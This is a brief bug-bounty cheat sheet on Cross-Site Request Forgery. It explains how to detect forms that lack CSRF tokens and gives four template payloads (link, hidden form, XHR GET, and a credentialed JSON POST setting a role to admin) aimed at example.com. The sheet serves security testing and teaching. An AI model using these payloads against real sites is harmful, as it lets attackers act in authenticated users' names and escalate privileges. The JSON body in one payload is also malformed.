# Cross Site Request Forgery (CSRF)

## Introduction
Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated

## How to find
Usually found in forms. Try submit the form and check the HTTP request. If the HTTP request does not have a CSRF token then it is likely to be vulnerable to a CSRF attack. But in some cases, the CSRF token can be bypassed, try check this [List](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20CSRF.md)

## How to exploit
1. HTML GET Method

```html
<a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
```

2. HTML POST Method

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="uname" />
 <input type="submit" value="Submit Request" />
</form>
```

3. JSON GET Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

4. JSON POST Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

5. Multipart request
Soon